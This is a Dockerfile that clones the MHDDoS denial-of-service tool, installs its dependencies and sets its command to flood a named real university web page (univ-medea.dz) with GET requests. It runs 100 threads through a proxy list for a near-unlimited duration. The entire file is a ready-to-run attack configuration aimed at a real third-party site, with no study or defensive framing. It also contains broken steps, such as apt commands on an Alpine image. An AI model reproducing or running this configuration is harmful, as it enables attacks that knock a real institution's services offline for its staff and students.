FROM alpine
RUN apt update
RUN apt upgrade
RUN git clone https://github.com/MatrixTM/MHDDoS
RUN cd MHDDoS/
RUN  pip install -r requirements.txt
CMD ["supervisord", "-c", "/etc/supervisor/supervisord.conf"]
CMD ["python3", "start.py", "GET", "https://www.univ-medea.dz/scripts/uscol/", "0", "100", "proxy.txt", "100", "9999999999", "true"]
